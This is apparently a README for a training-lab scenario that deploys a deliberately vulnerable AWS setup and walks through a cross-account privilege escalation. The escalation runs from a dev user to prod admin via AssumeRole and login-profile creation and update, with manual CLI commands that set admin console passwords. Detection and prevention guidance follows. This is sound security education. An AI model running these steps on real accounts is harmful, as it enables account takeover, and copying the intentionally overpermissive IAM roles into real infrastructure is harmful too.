# Multi-Hop Cross-Account Privilege Escalation (Both Sides)

* **Category:** Privilege Escalation
* **Sub-Category:** privilege-chaining
* **Path Type:** cross-account
* **Target:** to-admin
* **Environments:** dev, prod
* **Cost Estimate:** $0/mo
* **Technique:** Multi-hop privilege escalation across both dev and prod accounts using login profile manipulation
* **Terraform Variable:** `enable_cross_account_dev_to_prod_multi_hop_multi_hop_both_sides`
* **Schema Version:** 1.0.0
* **Attack Path:** starting_user_dev → (AssumeRole) → helpdesk_role → (iam:CreateLoginProfile) → josh_user (admin in dev) → (sts:AssumeRole cross-account) → trustsdev_role → (iam:UpdateLoginProfile) → jeremy_user (admin in prod)
* **Attack Principals:** `arn:aws:iam::{dev_account_id}:user/pl-pathfinding-starting-user-dev`; `arn:aws:iam::{dev_account_id}:role/pl-helpdesk`; `arn:aws:iam::{dev_account_id}:user/pl-Josh`; `arn:aws:iam::{prod_account_id}:role/pl-trustsdev`; `arn:aws:iam::{prod_account_id}:user/pl-Jeremy`
* **Required Permissions:** `iam:CreateLoginProfile` on `arn:aws:iam::{dev_account_id}:user/pl-Josh`; `sts:AssumeRole` on `arn:aws:iam::{prod_account_id}:role/pl-trustsdev`; `iam:UpdateLoginProfile` on `arn:aws:iam::{prod_account_id}:user/pl-Jeremy`
* **Helpful Permissions:** `iam:GetLoginProfile` (View existing login profile configuration); `iam:ListUsers` (Discover users in both accounts); `iam:GetUser` (View user details and permissions)
* **MITRE Tactics:** TA0004 - Privilege Escalation, TA0006 - Credential Access, TA0008 - Lateral Movement
* **MITRE Techniques:** T1098.001 - Account Manipulation: Additional Cloud Credentials, T1078.004 - Valid Accounts: Cloud Accounts

This module demonstrates a complex multi-hop privilege escalation attack that spans both dev and prod accounts, using login profile manipulation to escalate privileges across account boundaries.

## Attack Overview

The attack path shows how a dev user can escalate to admin privileges across both dev and prod accounts through a series of role assumptions and login profile manipulations.

This attack demonstrates a critical multi-hop privilege escalation vulnerability. A dev user can access prod resources through login profile manipulation. The multi-hop nature of this attack chain spans multiple accounts, ultimately granting full admin access in both dev and prod accounts.

This configuration appears in real environments where teams share helpdesk roles across account boundaries without fully auditing the downstream privilege chains that those roles enable. The cross-account trust relationship combined with unconstrained login profile permissions creates a path that may not be obvious from a single-account policy review.

### MITRE ATT&CK Mapping

- **Tactics**: TA0004 - Privilege Escalation, TA0006 - Credential Access, TA0008 - Lateral Movement
- **Techniques**: T1098.001 - Account Manipulation: Additional Cloud Credentials, T1078.004 - Valid Accounts: Cloud Accounts

### Principals in the attack path

- `arn:aws:iam::{DEV_ACCOUNT}:user/pl-pathfinding-starting-user-dev` (starting principal in dev account)
- `arn:aws:iam::{DEV_ACCOUNT}:role/pl-helpdesk` (intermediate role in dev account with login profile creation permissions)
- `arn:aws:iam::{DEV_ACCOUNT}:user/pl-Josh` (admin user in dev account; receives login profile)
- `arn:aws:iam::{PROD_ACCOUNT}:role/pl-trustsdev` (intermediate role in prod account that trusts Josh from dev)
- `arn:aws:iam::{PROD_ACCOUNT}:user/pl-Jeremy` (admin user in prod account; receives updated login profile)

### Attack Path Diagram

```mermaid
graph LR
    %% Nodes
    Pathfinding[dev:user:pl-pathfinding-starting-user-dev]
    Helpdesk[dev:role:pl-helpdesk]
    Josh[dev:user:pl-Josh]
    TrustsDev[prod:role:pl-trustsdev]
    Jeremy[prod:user:pl-Jeremy]

    %% Edges
    Pathfinding -->|sts:AssumeRole| Helpdesk
    Helpdesk -->|iam:CreateLoginProfile| Josh
    Josh -->|sts:AssumeRole| TrustsDev
    TrustsDev -->|iam:UpdateLoginProfile| Jeremy

    %% Styling
    style Pathfinding fill:#ff9999,stroke:#333,stroke-width:2px
    style Helpdesk fill:#ffcc99,stroke:#333,stroke-width:2px
    style Josh fill:#ffcc99,stroke:#333,stroke-width:2px
    style TrustsDev fill:#ffcc99,stroke:#333,stroke-width:2px
    style Jeremy fill:#99ff99,stroke:#333,stroke-width:2px
```



### Attack Steps

1. **Initial Access**: Dev user `pl-pathfinding-starting-user-dev` has `sts:AssumeRole` permission on `pl-helpdesk` role
2. **Hop 1 - Role Assumption**: Dev user assumes the `pl-helpdesk` role in the dev account
3. **Hop 2 - Login Profile Creation**: Helpdesk role creates a login profile for `pl-Josh` user (admin in dev)
4. **Hop 3 - Cross-Account Role Assumption**: Josh user (now with login profile) assumes the `pl-trustsdev` role in the prod account
5. **Hop 4 - Login Profile Update**: Trustsdev role updates the login profile for `pl-Jeremy` user (admin in prod)
6. **Verification**: Jeremy now has admin access in the prod account; confirm with `sts:GetCallerIdentity` and an admin API call

### Scenario specific resources created

| ARN | Purpose |
|-----|---------|
| `arn:aws:iam::{DEV_ACCOUNT}:user/pl-pathfinding-starting-user-dev` | Starting principal in dev account |
| `arn:aws:iam::{DEV_ACCOUNT}:role/pl-helpdesk` | Intermediate helpdesk role with `iam:CreateLoginProfile` permission |
| `arn:aws:iam::{DEV_ACCOUNT}:user/pl-Josh` | Admin user in dev; target of login profile creation |
| `arn:aws:iam::{PROD_ACCOUNT}:role/pl-trustsdev` | Prod role that trusts Josh user from dev account |
| `arn:aws:iam::{PROD_ACCOUNT}:user/pl-Jeremy` | Admin user in prod; target of login profile update |

## Attack Lab

### Prerequisites

1. Install the `plabs` CLI:
   ```bash
   brew install pathfinding-labs/tap/plabs
   ```
2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)

### Deploy with plabs non-interactive

```bash
plabs enable enable_cross_account_dev_to_prod_multi_hop_multi_hop_both_sides
plabs apply
```

### Deploy with plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `space` to enable it
4. Press `d` to deploy

### Executing the automated demo_attack script

The script will:

1. Verify current identity and permissions for the starting dev user
2. Assume the `pl-helpdesk` role in the dev account
3. Create a login profile for the `pl-Josh` user
4. Assume the `pl-trustsdev` role in the prod account as Josh
5. Update the login profile for the `pl-Jeremy` user in prod
6. Confirm admin access in both accounts
7. Reset login profiles to their original state

#### Resources created by attack script

- Login profile for `pl-Josh` (created during the attack; removed by cleanup)
- Updated login profile password for `pl-Jeremy` (reset by cleanup)

#### With plabs non-interactive

```bash
plabs demo --list
plabs demo multi-hop-both-sides
```

#### With plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `r` to run the demo script

### Executing the attack manually

```bash
# Step 1: Start as the dev pathfinding starting user
export AWS_PROFILE=dev
aws sts get-caller-identity

# Step 2: Assume the helpdesk role in dev
HELPDESK_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{DEV_ACCOUNT}:role/pl-helpdesk" \
  --role-session-name "helpdesk-session")
export AWS_ACCESS_KEY_ID=$(echo $HELPDESK_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $HELPDESK_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $HELPDESK_CREDS | jq -r '.Credentials.SessionToken')

# Step 3: Create a login profile for pl-Josh
aws iam create-login-profile \
  --user-name pl-Josh \
  --password "Pathfinding@Labs1!" \
  --no-password-reset-required

# Step 4: Assume the pl-trustsdev role in prod as Josh
# (Configure credentials for Josh and perform cross-account assume-role)
TRUSTSDEV_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{PROD_ACCOUNT}:role/pl-trustsdev" \
  --role-session-name "trustsdev-session")
export AWS_ACCESS_KEY_ID=$(echo $TRUSTSDEV_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $TRUSTSDEV_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $TRUSTSDEV_CREDS | jq -r '.Credentials.SessionToken')

# Step 5: Update the login profile for pl-Jeremy in prod
aws iam update-login-profile \
  --user-name pl-Jeremy \
  --password "Pathfinding@Labs1!" \
  --no-password-reset-required

# Step 6: Verify admin access as Jeremy
aws sts get-caller-identity
```

### Cleanup

#### With plabs non-interactive

```bash
plabs cleanup --list
plabs cleanup multi-hop-both-sides
```

#### With plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `c` to run the cleanup script

### Teardown with plabs non-interactive

```bash
plabs disable enable_cross_account_dev_to_prod_multi_hop_multi_hop_both_sides
plabs apply
```

### Teardown with plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `space` to disable it
4. Press `D` to destroy

## Detecting Misconfiguration (CSPM)

### What CSPM tools should detect

- IAM role (`pl-helpdesk`) has `iam:CreateLoginProfile` permission scoped to a privileged user (`pl-Josh`), creating a privilege escalation path
- IAM role (`pl-trustsdev`) in prod has `iam:UpdateLoginProfile` permission scoped to a privileged user (`pl-Jeremy`), creating a privilege escalation path
- Cross-account role trust (`pl-trustsdev`) allows assumption by a principal from a non-production account (`pl-Josh` in dev), violating account isolation
- Privilege escalation path exists from dev account to prod admin via login profile manipulation
- `pl-Josh` and `pl-Jeremy` users hold full admin policies, making them high-value targets for login profile manipulation

### Prevention recommendations

- Apply the principle of least privilege: avoid granting `iam:CreateLoginProfile` and `iam:UpdateLoginProfile` unless absolutely necessary, and scope them to non-privileged users only
- Limit cross-account role assumptions to specific, documented use cases; use conditions like `aws:PrincipalOrgID` or explicit account conditions in trust policies
- Monitor and alert on login profile creation and updates using CloudTrail; treat any modification to a privileged user's login profile as a high-severity event
- Use more restrictive trust policies for cross-account roles, including `sts:ExternalId` conditions and MFA requirements
- Regularly audit cross-account permissions and login profile usage across all accounts in your organization
- Implement SCPs that deny `iam:CreateLoginProfile` and `iam:UpdateLoginProfile` for production account roles that do not require console access

## Detection Abuse (CloudSIEM)

### CloudTrail events to monitor

- `STS: AssumeRole` — Role assumption from dev to the helpdesk role; alert when the source principal is the pathfinding starting user
- `IAM: CreateLoginProfile` — Login profile created for a user; critical when the target user holds admin or elevated permissions
- `STS: AssumeRole` — Cross-account role assumption from dev `pl-Josh` to prod `pl-trustsdev`; alert on cross-account assumptions involving non-prod principals
- `IAM: UpdateLoginProfile` — Login profile updated for a user; high severity when the target user holds admin permissions in prod
- `STS: GetCallerIdentity` — Identity verification calls that follow a chain of role assumptions; useful for tracing lateral movement

### Detonation logs

_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._
